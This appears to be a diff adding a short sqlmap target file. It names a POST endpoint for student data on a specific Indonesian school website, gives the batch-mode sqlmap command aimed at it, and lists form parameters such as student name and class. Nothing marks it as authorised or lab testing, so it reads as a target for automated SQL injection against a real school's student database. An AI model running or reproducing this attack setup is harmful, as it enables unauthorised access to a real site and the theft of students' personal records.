@@ -1,0 +1,3 @@
+http://smk-cakra-nusantara.sekolahan.id:80/datasiswa (POST)  # /usr/bin/sqlmap -l sql2.txt --dbms=mysql --output-dir=/home/cruz/SIDpy --batch
+
+snamasiswa=asda&s_kip=1&skelas=48&s_jurusan=1
